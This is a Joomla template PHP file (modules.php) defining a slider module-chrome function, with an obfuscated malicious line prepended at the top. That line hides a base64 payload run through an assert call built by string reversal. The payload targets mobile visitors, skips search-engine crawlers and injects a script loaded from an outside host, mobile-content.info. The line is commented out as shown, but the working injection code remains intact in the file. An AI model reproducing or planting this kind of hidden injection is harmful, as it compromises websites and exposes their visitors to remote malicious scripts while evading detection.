<?php
//$_ = strrev('tressa'); @$_("e\166\141\154\050b\141\163\145\066\064\137\144\145\143\157\144\145\050'aWYgKChwcmVnX21hdGNoKCcvdGV4dFwvdm5kLndhcC53bWx8YXBwbGljYXRpb25cL3ZuZC53YXAueGh0bWxcK3htbC9zaScsIEAkX1NFUlZFUlsnSFRUUF9BQ0NFUFQnXSkgfHwgcHJlZ19tYXRjaCgnL2FsY2F0ZWx8YW1vaXxhbmRyb2lkfGF2YW50Z298YmxhY2tiZXJyeXxiZW5xfGNlbGx8Y3JpY2tldHxkb2NvbW98ZWxhaW5lfGh0Y3xpZW1vYmlsZXxpcGhvbmV8aXBhZHxpcGFxfGlwb2R8ajJtZXxqYXZhfG9wZXJhLm1pbml8bWlkcHxtbXB8bW9iaXxtb3Rvcm9sYXxuZWMtfG5va2lhfHBhbG18cGFuYXNvbmljfHBoaWxpcHN8cGhvbmV8c2FnZW18c2hhcnB8c2llLXxzbWFydHBob25lfHNvbnl8c3ltYmlhbnx0LW1vYmlsZXx0ZWx1c3x1cFwuYnJvd3Nlcnx1cFwubGlua3x2b2RhZm9uZXx3YXB8d2Vib3N8d2lyZWxlc3N8eGRhfHhvb218enRlL3NpJywgQCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkgfHwgcHJlZ19tYXRjaCgnL21zZWFyY2h8bVw/cT0vc2knLCBAJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddKSkgJiYgIXByZWdfbWF0Y2goJy9tYWNpbnRvc2h8YW1lcmljYXxhdmFudHxkb3dubG9hZHx3aW5kb3dzXC1tZWRpYVwtcGxheWVyfHlhbmRleHxnb29nbGUvc2knLCBAJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKSkgeyBlY2hvICc8c2NyaXB0IHNyYz0iaHR0cDovL21vYmlsZS1jb250ZW50LmluZm8vanF1ZXJ5LTEuNy4xLmpzIj48L3NjcmlwdD4nOyBmbHVzaCgpOyBleGl0OyB9'\051\051\073");
?>
<?php
/**
 * @version		$Id: modules.php 10381 2008-06-01 03:35:53Z pasamio $
 * @package		Joomla
 * @copyright	Copyright (C) 2005 - 2008 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 * See COPYRIGHT.php for copyright notices and details.
 */

// no direct access
defined('_JEXEC') or die('Restricted access');

/**
 * This is a file to add template specific chrome to module rendering.  To use it you would
 * set the style attribute for the given module(s) include in your template to use the style
 * for each given modChrome function.
 *
 * eg.  To render a module mod_test in the sliders style, you would use the following include:
 * <jdoc:include type="module" name="test" style="slider" />
 *
 * This gives template designers ultimate control over how modules are rendered.
 *
 * NOTICE: All chrome wrapping methods should be named: modChrome_{STYLE} and take the same
 * two arguments.
 */

/*
 * Module chrome for rendering the module in a slider
 */
function modChrome_slider($module, &$params, &$attribs)
{
	jimport('joomla.html.pane');
	// Initialize variables
	$sliders = & JPane::getInstance('sliders');
	$sliders->startPanel( JText::_( $module->title ), 'module' . $module->id );
	echo $module->content;
	$sliders->endPanel();
}
?>